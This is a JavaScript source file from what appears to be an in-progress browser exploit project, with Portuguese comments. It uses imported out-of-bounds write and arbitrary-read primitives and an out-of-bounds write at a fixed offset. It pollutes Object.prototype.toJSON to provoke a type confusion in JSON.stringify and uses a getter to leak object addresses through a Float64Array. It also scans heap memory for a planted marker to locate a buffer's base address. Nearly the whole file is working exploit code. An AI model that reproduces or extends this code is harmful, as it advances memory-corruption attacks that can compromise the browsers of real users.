// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R31)

import { logS3, PAUSE_S3 } from './s3_utils.mjs'; // PAUSE_S3 é importado daqui
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
import {
    triggerOOB_primitive, 
    clearOOBEnvironment,
    arb_read, 
    oob_write_absolute, 
    oob_read_absolute,
    isOOBReady,
    oob_array_buffer_real 
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; 
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF]; 

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10; 

const SCAN_MARKER_VALUE_R31 = new AdvancedInt64(0x41424344, 0x45464748); 
const SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R31 = 0x100; 
const SCAN_HEAP_START_ADDRESS_R31 = new AdvancedInt64(0x0, 0x8A000000); 
const SCAN_HEAP_END_ADDRESS_R31 = new AdvancedInt64(0x0, 0x8A020000); 
const SCAN_STEP_R31 = 0x1000; 

function advInt64LessThanOrEqual(a, b) {
    if (!a || !b || typeof a.high !== 'function' || typeof a.low !== 'function' || typeof b.high !== 'function' || typeof b.low !== 'function') {
        logS3(`[advInt64LessThanOrEqual] Comparação inválida.`, 'error');
        return false; 
    }
    if (a.high() < b.high()) return true;
    if (a.high() > b.high()) return false;
    return a.low() <= b.low(); 
}

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R31() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R31`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + Memory Scan (R31) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R31...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        memory_scan_result: { success: false, msg: "Memory scan (R31): Not run.", found_at_address: null, oob_buffer_base_addr: null },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION R31: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; 
        let iteration_tc_first_detection_done = false; 

        const current_object_to_leak_A = { marker_A_R31: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R31: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        
        function toJSON_TA_Probe_Iter_Closure_R31() { 
            probe_call_count_iter++; const call_num=probe_call_count_iter; const ctts=Object.prototype.toString.call(this);
            const is_m2c=(this===marker_M2_ref_iter&&marker_M2_ref_iter!==null&&ctts==='[object Object]');
            logS3(`[PROBE_R31] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R31"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R31",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R31",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R31] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
            if(iteration_final_tc_details_from_probe&&(!this.hasOwnProperty('leaky_A_getter_v82')||iteration_final_tc_details_from_probe.call_number_tc_detected===call_num)){try{Object.defineProperty(this,'leaky_A_getter_v82',{get:function(){const det=iteration_final_tc_details_from_probe;if(det)det.getter_fired=true;if(!victim_typed_array_ref_iter?.buffer){if(det)det.leak_val_getter_int64="getter_victim_null";return"getter_victim_null";}
            let lvf=NaN,lis="getter_err_r31";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R31] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
            return nan?"getter_val_nan_inf":"getter_val_other";}catch(e_g){lis=`getter_ex:${e_g.message}`;if(det)det.leak_val_getter_int64=lis;return lis;}},enumerable:true,configurable:true});if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.getter_defined=true;this.leaky_B_direct_v82=current_object_to_leak_B;if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.direct_prop_set=true;}catch(e_m2d){if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.error_probe=`M2DefErr:${e_m2d.message}`;}}return this;}}catch(e_pm){return{err_pm:call_num,msg:e_pm.message};}return{gen_m:call_num,type:ctts};
        }

        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null; 
        let iter_memory_scan_result = { success: false, msg: "Memory scan (R31): Not run.", found_at_address: null, oob_buffer_base_addr: null };
        let heisenbugConfirmedThisIter = false; 
        
        try { 
            logS3(`  --- Fase 1 (R31): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            const ppKey='toJSON'; let origDesc=Object.getOwnPropertyDescriptor(Object.prototype,ppKey); let polluted=false;
            try {
                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R31,writable:true,configurable:true,enumerable:false}); polluted=true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe R31: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                try{iter_stringify_output_parsed=JSON.parse(iter_raw_stringify_output);}catch(e_p){iter_stringify_output_parsed={err_parse:iter_raw_stringify_output};}
                if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R31: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
                    if(iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error=new Error(iteration_final_tc_details_from_probe.error_probe);
                }else{logS3(` TC Probe R31: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
            }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
            logS3(`  --- Fase 1 (R31) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
            await PAUSE_S3(100);

            logS3(`  --- Fase 2 (R31): Teste de Memory Scan ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter) { 
                try {
                    await triggerOOB_primitive({ force_reinit: false, caller_fname: `${FNAME_CURRENT_ITERATION}-MemScanSetup` }); 
                    if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-MemScanSetup`)) {
                        throw new Error("Ambiente OOB não pronto para Memory Scan.");
                    }
                    logS3(`  MemScan: Plantando marcador ${SCAN_MARKER_VALUE_R31.toString(true)} em oob_array_buffer_real[${toHex(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R31)}]...`, 'info');
                    oob_write_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R31, SCAN_MARKER_VALUE_R31, 8);
                    const verify_marker = oob_read_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R31, 8);
                    if (!verify_marker.equals(SCAN_MARKER_VALUE_R31)) {
                        throw new Error(`Falha ao plantar/verificar marcador. Lido: ${verify_marker.toString(true)}`);
                    }
                    logS3(`  MemScan: Marcador plantado e verificado. Iniciando varredura...`, 'good');
                    let found_marker_addr = null;
                    let scan_count = 0;
                    
                    for (let current_scan_addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS_R31.low(), SCAN_HEAP_START_ADDRESS_R31.high()); 
                         advInt64LessThanOrEqual(current_scan_addr, SCAN_HEAP_END_ADDRESS_R31); 
                         current_scan_addr = current_scan_addr.add(SCAN_STEP_R31)) {
                        scan_count++;
                        if (scan_count % 20 === 0) { // Log mais frequente para o scan
                            logS3(`  MemScan: Escaneando em ${current_scan_addr.toString(true)} (Scan #${scan_count})...`, 'debug');
                        }
                        try { 
                            const value_at_addr = await arb_read(current_scan_addr, 8); 
                            if (isAdvancedInt64Object(value_at_addr) && value_at_addr.equals(SCAN_MARKER_VALUE_R31)) {
                                found_marker_addr = new AdvancedInt64(current_scan_addr.low(), current_scan_addr.high());
                                iter_memory_scan_result.found_at_address = found_marker_addr.toString(true);
                                iter_memory_scan_result.oob_buffer_base_addr = found_marker_addr.sub(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R31).toString(true);
                                iter_memory_scan_result.success = true;
                                iter_memory_scan_result.msg = `Marcador encontrado em ${found_marker_addr.toString(true)}! Base OOB estimada: ${iter_memory_scan_result.oob_buffer_base_addr}`;
                                logS3(`  MemScan: SUCESSO! ${iter_memory_scan_result.msg}`, "vuln"); break; 
                            }
                        } catch (e_scan_read) { 
                            if (scan_count % 50 === 0) { 
                                logS3(`  MemScan: Erro ao ler/processar ${current_scan_addr.toString(true)} (Scan #${scan_count}): ${e_scan_read.name} - ${e_scan_read.message}`, 'warn');
                            }
                        }
                        await PAUSE_S3(0); // <<<< PAUSE_S3 CORRIGIDO >>>>
                    }
                    if (!found_marker_addr) {
                        iter_memory_scan_result.msg = `MemScan: Marcador não encontrado após ${scan_count} scans na faixa ${SCAN_HEAP_START_ADDRESS_R31.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R31.toString(true)}.`;
                        logS3(`  MemScan: ${iter_memory_scan_result.msg}`, "warn");
                    }
                } catch (e_mem_scan) {
                    iter_memory_scan_result.msg = `MemScan EXCEPTION: ${e_mem_scan.message || String(e_mem_scan)}`;
                    if (!iter_primary_error) iter_primary_error = e_mem_scan;
                    logS3(`  MemScan: ${iter_memory_scan_result.msg}`, "critical"); // Logar a exceção principal do scan
                }
            } else { iter_memory_scan_result.msg = "Memory scan: Pulado (TC Fase 1 falhou)."; }
            logS3(`  --- Fase 2 (R31) Concluída. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");

        }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer; logS3(`  CRITICAL ERROR ITERATION R31: ${e_outer.message || String(e_outer)}`, "critical");}
        finally{clearOOBEnvironment({caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR31`});}

        final_probe_call_count_for_report = probe_call_count_iter;
        
        let current_iter_summary = { 
            oob_value:toHex(current_oob_value), error:iter_primary_error?(iter_primary_error.message||String(iter_primary_error)):null,
            tc_probe_details:iteration_final_tc_details_from_probe?JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)):null, 
            stringifyResult:iter_stringify_output_parsed,
            memory_scan_result_this_iter: iter_memory_scan_result, 
            heisenbug_on_M2_confirmed_by_tc_probe:heisenbugConfirmedThisIter 
        };
        iteration_results_summary.push(current_iter_summary);
        
        // Lógica para best_result_for_runner (R31)
        let tc_ok_this_iter = heisenbugConfirmedThisIter;
        let scan_successful_this_iter = iter_memory_scan_result.success;
        
        if (scan_successful_this_iter) { 
            if (!best_result_for_runner.memory_scan_result?.success || !best_result_for_runner.oob_value_used) {
                best_result_for_runner = { ...current_iter_summary };
            }
        } else if (tc_ok_this_iter) { 
            if (!best_result_for_runner.memory_scan_result?.success && (!best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe || !best_result_for_runner.oob_value_used) ) {
                 best_result_for_runner = { ...current_iter_summary };
            }
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = { ...current_iter_summary };
        }
        
        if(scan_successful_this_iter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R31: Scan OK!`;
        else if(tc_ok_this_iter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R31: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R31: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R31): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { 
        errorOccurred:best_result_for_runner.errorOccurred, 
        tc_probe_details:best_result_for_runner.tc_probe_details, 
        stringifyResult:best_result_for_runner.stringifyResult, 
        memory_scan_result: best_result_for_runner.memory_scan_result, 
        iteration_results_summary:iteration_results_summary, 
        total_probe_calls_last_iter:final_probe_call_count_for_report,
        oob_value_of_best_result:best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result:best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
    };
}
